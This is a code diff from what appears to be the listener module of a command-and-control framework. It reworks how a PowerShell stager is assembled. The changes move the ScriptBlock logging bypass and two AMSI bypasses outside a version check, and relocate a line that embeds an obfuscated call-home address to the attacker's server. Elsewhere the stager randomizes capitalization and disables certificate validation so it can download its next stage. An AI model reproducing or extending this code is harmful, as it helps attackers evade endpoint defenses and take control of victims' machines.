@@ -319,17 +319,18 @@ class Listener(object):
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
                     # ScriptBlock Logging bypass
-                    if scriptLogBypass:
-                        stager += bypasses.scriptBlockLogBypass()
-                    # @mattifestation's AMSI bypass
-                    if AMSIBypass:
-                        stager += bypasses.AMSIBypass()
-                    # rastamouse AMSI bypass
-                    if AMSIBypass2:
-                        stager += bypasses.AMSIBypass2()
+                if scriptLogBypass:
+                    stager += bypasses.scriptBlockLogBypass()
+                # @mattifestation's AMSI bypass
+                if AMSIBypass:
+                    stager += bypasses.AMSIBypass()
+                # rastamouse AMSI bypass
+                if AMSIBypass2:
+                    stager += bypasses.AMSIBypass2()
+                if safeChecks.lower() == 'true':
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
-                
+
                 stager += helpers.randomize_capitalization(
                     "$" + helpers.generate_random_script_var_name("wc") + "=New-Object System.Net.WebClient;")
                 if userAgent.lower() == 'default':
@@ -339,7 +340,7 @@ class Listener(object):
                 if 'https' in host:
                     # allow for self-signed certificates for https connections
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-                
+                stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
                 if userAgent.lower() != 'none':
                     stager += helpers.randomize_capitalization(
                         "$" + helpers.generate_random_script_var_name("wc") + '.Headers.Add(')
@@ -398,7 +399,7 @@ class Listener(object):
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL',
                                                              meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
-                stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
+
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
